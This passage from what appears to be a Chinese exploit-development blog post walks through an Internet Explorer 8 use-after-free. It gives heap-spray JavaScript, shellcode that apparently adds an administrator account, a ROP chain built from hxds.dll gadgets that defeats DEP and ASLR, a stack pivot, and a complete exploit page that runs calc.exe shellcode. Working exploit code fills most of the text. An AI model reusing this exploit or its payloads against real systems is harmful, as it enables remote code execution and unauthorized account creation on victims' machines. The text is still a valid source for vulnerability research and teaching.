}</code></pre><br><p>发现已经成功占位，<code>eax=1c1c1c1c</code>下一步就是<code>call [eax+0xdc]</code> <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629113337551?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629164659123?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><pre class="prettyprint"><code class=" hljs xml"><span class="hljs-doctype">&lt;!doctype html&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="javascript"><br> <span class="hljs-keyword">var</span> arr_div = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();<br> <span class="hljs-keyword">var</span> junk=<span class="hljs-built_in">unescape</span>(<span class="hljs-string">“%u1c1c%u1c1c”</span>);<br> <span class="hljs-keyword">while</span> (junk.length &lt; (<span class="hljs-number">0x100</span>- <span class="hljs-number">6</span>)/<span class="hljs-number">2</span>)<br> {<br>    junk+=junk;<br> }<br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">helloWorld</span><span class="hljs-params">()</span> {</span><br> <span class="hljs-keyword">var</span> e0 = <span class="hljs-literal">null</span>;<br> <span class="hljs-keyword">var</span> e1 = <span class="hljs-literal">null</span>;<br> <span class="hljs-keyword">var</span> e2 = <span class="hljs-literal">null</span>;<br> <span class="hljs-keyword">try</span> {<br>     e0 = document.getElementById(<span class="hljs-string">“a”</span>);<br>     e1 = document.getElementById(<span class="hljs-string">“b”</span>);<br>     e2 = document.createElement(<span class="hljs-string">“q”</span>);<br>     e1.applyElement(e2);<br>     e1.appendChild(document.createElement(<span class="hljs-string">‘button’</span>));<br>     e1.applyElement(e0);<br>     e2.outerText = <span class="hljs-string">“”</span>;<br>     e2.appendChild(document.createElement(<span class="hljs-string">‘body’</span>));<br> } <span class="hljs-keyword">catch</span>(e) { }<br> CollectGarbage();<br> <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x550</span>; i++)<span class="hljs-comment">//这里必须根据自己的电脑来配置</span><br> {<br>     arr_div[i]= document.createElement(<span class="hljs-string">“div”</span>);<br>     arr_div[i].title= junk.substring(<span class="hljs-number">0</span>,(<span class="hljs-number">0x58</span>-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);<br> }<br> }<br></span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">body</span> <span class="hljs-attribute">onload</span>=<span class="hljs-value">“eval(helloWorld())”</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">“a”</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">dfn</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">“b”</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">dfn</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre><br><p>这里有个问题，经常占位不成功，也不知道为什么。。</p><br><h2 id="0x3-最终shellcode含rop">0x3 最终shellcode（含ROP）</h2><br><p><strong>无DEP：</strong></p><br><p>最后写了一个没有带ROP的shellcode，能够成功劫持程序流，但不能继续执行（因为ie8自带DEP保护，必须用ROP绕过，日后再完善吧）</p><br><p>最后的shellcode执行流程是首先进行堆喷射，其次利用对象占位将刚刚释放的内存改写，接着就是UAF漏洞的执行了，会跳转到0x0c0c0c0c的地方去执行恶意代码</p><br><pre class="prettyprint"><code class=" hljs xml"><span class="hljs-doctype">&lt;!doctype html&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">script</span>&gt;</span><span class="javascript"><br><span class="hljs-comment">//堆喷射</span><br> <span class="hljs-comment">//Fix BSTR spec</span><br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">alloc</span><span class="hljs-params">(bytes, mystr)</span> {</span><br> <span class="hljs-keyword">while</span> (mystr.length&lt;bytes) mystr += mystr;<br> <span class="hljs-keyword">return</span> mystr.substr(<span class="hljs-number">0</span>, (bytes-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);<br> }<br><br> block_size = <span class="hljs-number">0x1000</span>;<br> padding_size = <span class="hljs-number">0x5FC</span>; <span class="hljs-comment">//offset to 0x0c0c0c0c inside our 0x1000 hex block</span><br> Padding = <span class="hljs-string">‘’</span>;<br> NopSlide = <span class="hljs-string">‘’</span>;<br><br> <span class="hljs-keyword">var</span> Shellcode =<br><span class="hljs-built_in">unescape</span>(<span class="hljs-string">‘%ud231%u30b2%u8b64%u8b12%u0c52%u528b%u8b1c%u0842%u728b%u8b20%u8012%u0c7e%u7533%u89f2%u03c7%u3c78%u578b%u0178%u8bc2%u207a%uc701%ued31%u348b%u01af%u45c6%u3e81%u6957%u456e%uf275%u7a8b%u0124%u66c7%u2c8b%u8b6f%u1c7a%uc701%u7c8b%ufcaf%uc701%u4b68%u6e33%u6801%u4220%u6f72%u2f68%u4441%u6844%u726f%u2073%u7468%u6172%u6874%u6e69%u7369%u2068%u6441%u686d%u6f72%u7075%u6368%u6c61%u6867%u2074%u6f6c%u2668%u6e20%u6865%u4444%u2620%u6e68%u2f20%u6841%u6f72%u334b%u3368%u206e%u6842%u7242%u4b6f%u7368%u7265%u6820%u7465%u7520%u2f68%u2063%u686e%u7865%u2065%u6368%u646d%u892e%ufee5%u534d%uc031%u5550%ud7ff’</span>);<br><br> <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; padding_size; p++){<br> Padding += <span class="hljs-built_in">unescape</span>(<span class="hljs-string">‘%u0c0c’</span>);}<br><br> <span class="hljs-keyword">for</span> (c = <span class="hljs-number">0</span>; c &lt; block_size; c++){<br> NopSlide += <span class="hljs-built_in">unescape</span>(<span class="hljs-string">‘%u1c1c’</span>);} <span class="hljs-comment">//shellcode hou</span><br> NopSlide = NopSlide.substring(<span class="hljs-number">0</span>,block_size - (Shellcode.length + Padding.length));<br><br> <span class="hljs-keyword">var</span> OBJECT = Padding + Shellcode + NopSlide;<br> OBJECT = alloc(<span class="hljs-number">0xfffe0</span>, OBJECT); <span class="hljs-comment">// 0xfffe0 = 1mb</span><br><br> <span class="hljs-keyword">var</span> evil = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();<br> <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> k = <span class="hljs-number">0</span>; k &lt; <span class="hljs-number">250</span>; k++) {<br> evil[k] = OBJECT.substr(<span class="hljs-number">0</span>, OBJECT.length);<br> }<br> alert(<span class="hljs-string">‘spray done !’</span>);<br><br><br><span class="hljs-keyword">var</span> arr_div = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();<br> <span class="hljs-keyword">var</span> junk=<span class="hljs-built_in">unescape</span>(<span class="hljs-string">“%u0c0c%u0c0c”</span>);<br> <span class="hljs-keyword">while</span> (junk.length &lt; (<span class="hljs-number">0x100</span>- <span class="hljs-number">6</span>)/<span class="hljs-number">2</span>)<br> {<br>    junk+=junk;<br> }<br> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">helloWorld</span><span class="hljs-params">()</span> {</span><br> <span class="hljs-keyword">var</span> e0 = <span class="hljs-literal">null</span>;<br> <span class="hljs-keyword">var</span> e1 = <span class="hljs-literal">null</span>;<br> <span class="hljs-keyword">var</span> e2 = <span class="hljs-literal">null</span>;<br> <span class="hljs-keyword">try</span> {<br>     e0 = document.getElementById(<span class="hljs-string">“a”</span>);<br>     e1 = document.getElementById(<span class="hljs-string">“b”</span>);<br>     e2 = document.createElement(<span class="hljs-string">“q”</span>);<br>     e1.applyElement(e2);<br>     e1.appendChild(document.createElement(<span class="hljs-string">‘button’</span>));<br>     e1.applyElement(e0);<br>     e2.outerText = <span class="hljs-string">“”</span>;<br>     e2.appendChild(document.createElement(<span class="hljs-string">‘body’</span>));<br> } <span class="hljs-keyword">catch</span>(e) { }<br> CollectGarbage();<br> <span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x550</span>; i++)<br> {<br>     arr_div[i]= document.createElement(<span class="hljs-string">“div”</span>);<br>     arr_div[i].title= junk.substring(<span class="hljs-number">0</span>,(<span class="hljs-number">0x58</span>-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);<br> }<br> }<br><br></span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">body</span> <span class="hljs-attribute">onload</span>=<span class="hljs-value">“eval(helloWorld())”</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">“a”</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170629180354132?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p><strong>有DEP：</strong> <br><br>上述情况是在xp情况下 可以实行的应为没有windows的保护机制，而在本实验环境下是不能够实行的，在win7的ie8下有alsr以及dep的保护我们采取的措施是使用未开启alsr 的office2010的hxds.dll以及构造ROP链关闭ie8的数据保护。 <br><br>使用<code>location.href = ‘ms-help://‘</code>可以让ie浏览器自动加载hxds.dll模块（一般情况下ASLR是关掉的） <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170707154747898?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>首先让浏览器加载hxds.dll<br><br><br><br></p><br><pre class="prettyprint"><code class=" hljs xml"><br> <span class="hljs-doctype">&lt;!DOCTYPE html&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-title">title</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-title">title</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-title">body</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-title">script</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">“text/javascript”</span>&gt;</span><span class="javascript"><br>    location.href = <span class="hljs-string">‘ms-help://‘</span>;<br> </span><span class="hljs-tag">&lt;/<span class="hljs-title">script</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span><br> <span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre><br><p>利用immunity Debugger  的mona插件寻找rop链 <br><br>下面给出一种rop链的构造方法<br></p><br><pre class="prettyprint"><code class=" hljs perl">var ropchain =<br><br><span class="hljs-string">“<span class="hljs-variable">%u34b4</span><span class="hljs-variable">%u51bf</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51bf34b4</span>     <span class="hljs-comment"># POP ESI # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%u10b8</span><span class="hljs-variable">%u51bd</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51bd10b8</span>     <span class="hljs-comment"># ptr to &amp;VirtualProtect() [IAT hxds.dll]</span><br><span class="hljs-string">“<span class="hljs-variable">%u2d97</span><span class="hljs-variable">%u51bd</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51bd2d97</span>     <span class="hljs-comment"># MOV EAX,DWORD PTR DS:[ESI] # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%ucba0</span><span class="hljs-variable">%u51bd</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51bdcba0</span>     <span class="hljs-comment"># XCHG EAX,ESI # RETN 00 [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%u79e2</span><span class="hljs-variable">%u51c3</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c379e2</span>     <span class="hljs-comment"># POP EBP # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%u9683</span><span class="hljs-variable">%u51c5</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c59683</span>     <span class="hljs-comment"># &amp; call esp [hxds.dll]</span><br><span class="hljs-string">“<span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c56fbd</span>     <span class="hljs-comment"># POP EAX # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%ufdfe</span><span class="hljs-variable">%ua17f</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0xa17ffdfe</span>     <span class="hljs-comment"># put delta into eax (-&gt; put 0x00000201 into ebx)</span><br><span class="hljs-string">“<span class="hljs-variable">%u1e01</span><span class="hljs-variable">%u51c1</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51C11E01</span>     <span class="hljs-comment"># ADD EAX,5E800403 # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%u92d8</span><span class="hljs-variable">%u51c3</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51C392D8</span>     <span class="hljs-comment"># XCHG EAX,EBX # RETN [hxds.dll]</span><br><span class="hljs-string">“<span class="hljs-variable">%ue67d</span><span class="hljs-variable">%u51bf</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51BFE67D</span>     <span class="hljs-comment"># XOR EAX,EAX # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c56fbd</span>     <span class="hljs-comment"># POP EAX # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%ufc3d</span><span class="hljs-variable">%ua17f</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0xa17ffc3d</span>     <span class="hljs-comment"># put delta into eax (-&gt; put 0x00000040 into edx)</span><br><span class="hljs-string">“<span class="hljs-variable">%u1e01</span><span class="hljs-variable">%u51c1</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51C11E01</span>     <span class="hljs-comment"># ADD EAX,5E800403 # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%u592b</span><span class="hljs-variable">%u51bf</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51BF592B</span>     <span class="hljs-comment"># XCHG EAX,EDX # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%ucf3e</span><span class="hljs-variable">%u51be</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51becf3e</span>     <span class="hljs-comment"># POP ECX # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%ud150</span><span class="hljs-variable">%u51c5</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c5d150</span>     <span class="hljs-comment"># &amp;Writable location [hxds.dll]</span><br><span class="hljs-string">“<span class="hljs-variable">%uf563</span><span class="hljs-variable">%u51be</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51bef563</span>     <span class="hljs-comment"># POP EDI # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%u7402</span><span class="hljs-variable">%u51c0</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c07402</span>     <span class="hljs-comment"># RETN (ROP NOP) [hxds.dll]</span><br><span class="hljs-string">“<span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span>“</span> +   <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51c56fbd</span>     <span class="hljs-comment"># POP EAX # RETN [hxds.dll] </span><br><span class="hljs-string">“<span class="hljs-variable">%u9090</span><span class="hljs-variable">%u9090</span>“</span> +   <span class="hljs-regexp">//</span>    <span class="hljs-number">0x90909090</span>     <span class="hljs-comment"># nop</span><br><span class="hljs-string">“<span class="hljs-variable">%ua8dc</span><span class="hljs-variable">%u51bd</span>“</span>;    <span class="hljs-regexp">//</span>   <span class="hljs-number">0x51BDA8DC</span>     <span class="hljs-comment"># PUSHAD # POP ECX # RETN [hxds.dll]</span></code></pre><br><p>有了rop了链以及精准堆喷射,现在只需要stack pivot就OK了 <br><br>同样我们使用hxds.dll中的rop构造栈翻转<br></p><br><pre class="prettyprint"><code class=" hljs perl">var stackpivot += <span class="hljs-string">“<span class="hljs-variable">%ub30e</span><span class="hljs-variable">%u51c3</span>“</span>; <span class="hljs-regexp">//</span> <span class="hljs-number">0x51c3b30e</span>  <span class="hljs-comment"># RETN  [hxds.dll] (align esp)</span><br>stackpivot += <span class="hljs-string">“<span class="hljs-variable">%u198c</span><span class="hljs-variable">%u51be</span>“</span>; <span class="hljs-regexp">//</span> <span class="hljs-number">0x51be198c</span>  <span class="hljs-comment"># POP EBX # RETN [hxds.dll] </span><br>stackpivot += <span class="hljs-string">“<span class="hljs-variable">%u4a41</span><span class="hljs-variable">%u51be</span>“</span>; <span class="hljs-regexp">//</span> <span class="hljs-number">0x51be4a41</span>  <span class="hljs-comment"># XCHG EAX,ESP # RETN  [hxds.dll]</span></code></pre><br><p>第一次执行第三行的XCHG代码使得栈翻转到堆上第一行的位置，执行第二行的时候正好将XCHG POP进ebx中去 避免了第二次翻转</p><br><p>下面是完整代码</p><br><pre class="prettyprint"><code class=" hljs perl">&lt;!doctype html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;script&gt;<br>    var arr_div = new Array();<br>    var junk=unescape(<span class="hljs-string">“<span class="hljs-variable">%u0b30</span><span class="hljs-variable">%u0c0c</span>“</span>);<br>    <span class="hljs-keyword">while</span> (junk.<span class="hljs-keyword">length</span> &lt; (<span class="hljs-number">0x100</span>- <span class="hljs-number">6</span>)/<span class="hljs-number">2</span>)<br>    {<br>     junk+=junk;<br>    }<br>    var nops=unescape(<span class="hljs-string">“<span class="hljs-variable">%u9090</span><span class="hljs-variable">%u9090</span>“</span>);<br>    <span class="hljs-keyword">while</span>(nops.<span class="hljs-keyword">length</span>&lt;<span class="hljs-number">0x400</span>) nops+=nops;<br>    <span class="hljs-keyword">while</span>(nops.<span class="hljs-keyword">length</span>&lt;<span class="hljs-number">0x5f2</span>) nops+=unescape(<span class="hljs-string">“<span class="hljs-variable">%ub30e</span><span class="hljs-variable">%u51c3</span>“</span>);<br>    nops+=unescape(<span class="hljs-string">“<span class="hljs-variable">%u198c</span><span class="hljs-variable">%u51be</span>“</span>);<br>    var code =unescape(<br>     <span class="hljs-string">“<span class="hljs-variable">%u4a41</span><span class="hljs-variable">%u51be</span><span class="hljs-variable">%u34b4</span><span class="hljs-variable">%u51bf</span><span class="hljs-variable">%u10b8</span><span class="hljs-variable">%u51bd</span><span class="hljs-variable">%u2d97</span><span class="hljs-variable">%u51bd</span><span class="hljs-variable">%ucba0</span><span class="hljs-variable">%u51bd</span>“</span>+<br>     <span class="hljs-string">“<span class="hljs-variable">%u79e2</span><span class="hljs-variable">%u51c3</span><span class="hljs-variable">%u9683</span><span class="hljs-variable">%u51c5</span><span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span><span class="hljs-variable">%ufffe</span><span class="hljs-variable">%ua17f</span>“</span>+<br>     <span class="hljs-string">“<span class="hljs-variable">%u1e01</span><span class="hljs-variable">%u51c1</span><span class="hljs-variable">%u92d8</span><span class="hljs-variable">%u51c3</span><span class="hljs-variable">%ue67d</span><span class="hljs-variable">%u51bf</span><span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span>“</span>+<br>     <span class="hljs-string">“<span class="hljs-variable">%ufc3d</span><span class="hljs-variable">%ua17f</span><span class="hljs-variable">%u1e01</span><span class="hljs-variable">%u51c1</span><span class="hljs-variable">%u592b</span><span class="hljs-variable">%u51bf</span><span class="hljs-variable">%ucf3e</span><span class="hljs-variable">%u51be</span>“</span>+<br>     <span class="hljs-string">“<span class="hljs-variable">%ud150</span><span class="hljs-variable">%u51c5</span><span class="hljs-variable">%uf563</span><span class="hljs-variable">%u51be</span><span class="hljs-variable">%u7402</span><span class="hljs-variable">%u51c0</span><span class="hljs-variable">%u6fbd</span><span class="hljs-variable">%u51c5</span>“</span>+<br>     <span class="hljs-string">“<span class="hljs-variable">%u9090</span><span class="hljs-variable">%u9090</span><span class="hljs-variable">%ua8dc</span><span class="hljs-variable">%u51bd</span>“</span>+                                        <span class="hljs-regexp">//</span>ROP结束<br>     <span class="hljs-string">“<span class="hljs-variable">%uc481</span><span class="hljs-variable">%uf254</span><span class="hljs-variable">%uffff</span><span class="hljs-variable">%u2ebf</span><span class="hljs-variable">%ue4ed</span><span class="hljs-variable">%udbc0</span><span class="hljs-variable">%ud9c8</span><span class="hljs-variable">%u2474</span>“</span> +               <span class="hljs-regexp">//shellcode</span> calc.exe<br>     <span class="hljs-string">“<span class="hljs-variable">%u58f4</span><span class="hljs-variable">%uc933</span><span class="hljs-variable">%u33b1</span><span class="hljs-variable">%u7831</span><span class="hljs-variable">%u0312</span><span class="hljs-variable">%u1278</span><span class="hljs-variable">%uee83</span><span class="hljs-variable">%u06e9</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%u1235</span><span class="hljs-variable">%u4f19</span><span class="hljs-variable">%ueab6</span><span class="hljs-variable">%u30da</span><span class="hljs-variable">%u0f3e</span><span class="hljs-variable">%u62eb</span><span class="hljs-variable">%u4424</span><span class="hljs-variable">%ub35e</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%u082e</span><span class="hljs-variable">%u3853</span><span class="hljs-variable">%ub862</span><span class="hljs-variable">%u4ce0</span><span class="hljs-variable">%ucfab</span><span class="hljs-variable">%ufa41</span><span class="hljs-variable">%ufe8d</span><span class="hljs-variable">%uca52</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%uac11</span><span class="hljs-variable">%u4c91</span><span class="hljs-variable">%uaeee</span><span class="hljs-variable">%uaec5</span><span class="hljs-variable">%u61cf</span><span class="hljs-variable">%uae18</span><span class="hljs-variable">%u9f08</span><span class="hljs-variable">%ue2d3</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%ud4c1</span><span class="hljs-variable">%u1346</span><span class="hljs-variable">%ua865</span><span class="hljs-variable">%u125a</span><span class="hljs-variable">%ua7a9</span><span class="hljs-variable">%u6ce3</span><span class="hljs-variable">%u77cc</span><span class="hljs-variable">%uc697</span>“</span> +a<br>     <span class="hljs-string">“<span class="hljs-variable">%ua7cf</span><span class="hljs-variable">%u5c08</span><span class="hljs-variable">%u5f87</span><span class="hljs-variable">%u3a22</span><span class="hljs-variable">%u5e38</span><span class="hljs-variable">%u58e7</span><span class="hljs-variable">%u2904</span><span class="hljs-variable">%uab8c</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%ua8fe</span><span class="hljs-variable">%ue244</span><span class="hljs-variable">%u9bff</span><span class="hljs-variable">%ua9a8</span><span class="hljs-variable">%u14c1</span><span class="hljs-variable">%ub325</span><span class="hljs-variable">%u9206</span><span class="hljs-variable">%uc6d6</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%ue17c</span><span class="hljs-variable">%ud16b</span><span class="hljs-variable">%u9846</span><span class="hljs-variable">%u54b7</span><span class="hljs-variable">%u3a5b</span><span class="hljs-variable">%uce33</span><span class="hljs-variable">%ubbbf</span><span class="hljs-variable">%u8990</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%ub734</span><span class="hljs-variable">%udd5d</span><span class="hljs-variable">%udb13</span><span class="hljs-variable">%u3260</span><span class="hljs-variable">%ue728</span><span class="hljs-variable">%ub5e9</span><span class="hljs-variable">%u6eff</span><span class="hljs-variable">%u91a9</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%u2bdb</span><span class="hljs-variable">%ubb69</span><span class="hljs-variable">%u917a</span><span class="hljs-variable">%uc4dc</span><span class="hljs-variable">%u7d9d</span><span class="hljs-variable">%u6080</span><span class="hljs-variable">%u6fd5</span><span class="hljs-variable">%u13d5</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%ue5b4</span><span class="hljs-variable">%u9128</span><span class="hljs-variable">%u40c2</span><span class="hljs-variable">%ua92a</span><span class="hljs-variable">%ue2cc</span><span class="hljs-variable">%u9843</span><span class="hljs-variable">%u6d47</span><span class="hljs-variable">%u2513</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%uca82</span><span class="hljs-variable">%u6feb</span><span class="hljs-variable">%u7a8f</span><span class="hljs-variable">%u3664</span><span class="hljs-variable">%u3f45</span><span class="hljs-variable">%uc9e9</span><span class="hljs-variable">%u03b3</span><span class="hljs-variable">%u4a14</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%ufb36</span><span class="hljs-variable">%u52e3</span><span class="hljs-variable">%ufe33</span><span class="hljs-variable">%ud4a8</span><span class="hljs-variable">%u72af</span><span class="hljs-variable">%ub0a0</span><span class="hljs-variable">%u21cf</span><span class="hljs-variable">%u90c1</span>“</span> +<br>     <span class="hljs-string">“<span class="hljs-variable">%ua4b3</span><span class="hljs-variable">%u7851</span><span class="hljs-variable">%u431a</span><span class="hljs-variable">%u1bd2</span><span class="hljs-variable">%u4162</span>“</span>);<br>    var offset=<span class="hljs-number">0x5F4</span>;<br>    var junk_offset=nops.substring(<span class="hljs-number">0</span>,<span class="hljs-number">0x5F4</span>);<br>    var shellcode=junk_offset+code+nops.substring(<span class="hljs-number">0</span>,<span class="hljs-number">0x800</span>-<span class="hljs-number">0x5F4</span>-code.<span class="hljs-keyword">length</span>);<br>    <span class="hljs-keyword">while</span>(shellcode.<span class="hljs-keyword">length</span>&lt;<span class="hljs-number">0x40000</span>)<br>    {<br>        shellcode+=shellcode;<br>    }<br>    var block = shellcode.substring(<span class="hljs-number">0</span>,<span class="hljs-number">0x40000</span>);<br>    var heap_chunks = new Array();<br>    <span class="hljs-keyword">for</span> (var i=<span class="hljs-number">1</span>; i &lt; <span class="hljs-number">0x700</span>; i++)<br>        heap_chunks[i] = block.substring(<span class="hljs-number">0</span>,<span class="hljs-number">0x40000</span>);<br>    <span class="hljs-regexp">//location</span>.href = <span class="hljs-string">‘ms-help://‘</span>;<br>    function helloWorld()<br>    {<br>    <span class="hljs-regexp">//alert</span>(<span class="hljs-number">1</span>);<br>          var e<span class="hljs-number">0</span> = null;<br>          var e1 = null;<br>          var e2 = null;<br><br>          try<br>          {<br>               e<span class="hljs-number">0</span> = document.getElementById(<span class="hljs-string">“a”</span>);<br>               e1 = document.getElementById(<span class="hljs-string">“b”</span>);<br>               e2 = document.createElement(<span class="hljs-string">“q”</span>);<br>               e1.applyElement(e2);<br>               e1.appendChild(document.createElement(<span class="hljs-string">‘button’</span>));<br>               e1.applyElement(e<span class="hljs-number">0</span>);<br>               e2.outerText = <span class="hljs-string">“”</span>;<br>               e2.appendChild(document.createElement(<span class="hljs-string">‘body’</span>));<br>          } catch(e) { }<br>          CollectGarbage();<br>           <span class="hljs-keyword">for</span>(var i = <span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x50</span>; i++)<br>          {<br>               arr_div[i]= document.createElement(<span class="hljs-string">“div”</span>);<br>               arr_div[i].title= junk.substring(<span class="hljs-number">0</span>,(<span class="hljs-number">0x58</span>-<span class="hljs-number">6</span>)/<span class="hljs-number">2</span>);<br>          }<br><br>     }<br><br>     &lt;<span class="hljs-regexp">/script&gt;<br>&lt;/head</span>&gt;<br>&lt;body onload=<span class="hljs-string">“helloWorld()”</span>&gt;<br>     &lt;form id=<span class="hljs-string">“a”</span>&gt;<br>     &lt;<span class="hljs-regexp">/form&gt;<br>     &lt;dfn id=”b”&gt;<br>     &lt;/dfn</span>&gt;<br>&lt;<span class="hljs-regexp">/body&gt;<br>&lt;/html</span>&gt;</code></pre><br><h1 id="0x05-实验结果">0x05 实验结果</h1><br><p><img alt="这里写图片描述" 